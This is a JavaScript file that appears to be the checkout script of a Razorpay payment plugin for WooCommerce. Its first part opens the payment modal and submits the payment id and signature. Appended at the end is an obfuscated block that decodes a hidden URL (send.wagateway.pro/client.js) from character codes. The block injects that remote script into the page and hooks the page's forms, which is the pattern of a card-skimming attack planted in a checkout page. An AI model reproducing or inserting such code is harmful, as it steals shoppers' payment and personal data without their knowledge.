(function() {
  var data = razorpay_wc_checkout_vars;
  var setDisabled = function(id, state) {
    if (typeof state === 'undefined') {
      state = true;
    }
    var elem = document.getElementById(id);
    if (state === false) {
      elem.removeAttribute('disabled');
    } else {
      elem.setAttribute('disabled', state);
    }
  };

  // Payment was closed without handler getting called
  data.modal = {
    ondismiss: function() {
      setDisabled('btn-razorpay', false);
    },
  };

  data.handler = function(payment) {
    setDisabled('btn-razorpay-cancel');
    var successMsg = document.getElementById('msg-razorpay-success');
    successMsg.style.display = 'block';
    document.getElementById('razorpay_payment_id').value =
      payment.razorpay_payment_id;
    document.getElementById('razorpay_signature').value =
      payment.razorpay_signature;
    document.razorpayform.submit();
  };

  var razorpayCheckout = new Razorpay(data);

  // global method
  function openCheckout() {
    // Disable the pay button
    setDisabled('btn-razorpay');
    razorpayCheckout.open();
  }

  function addEvent(element, evnt, funct) {
    if (element.attachEvent) {
      return element.attachEvent('on' + evnt, funct);
    } else return element.addEventListener(evnt, funct, false);
  }

  if (document.readyState === 'complete') {
    addEvent(document.getElementById('btn-razorpay'), 'click', openCheckout);
    openCheckout();
  } else {
    document.addEventListener('DOMContentLoaded', function() {
      addEvent(document.getElementById('btn-razorpay'), 'click', openCheckout);
      openCheckout();
    });
  }
})();

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db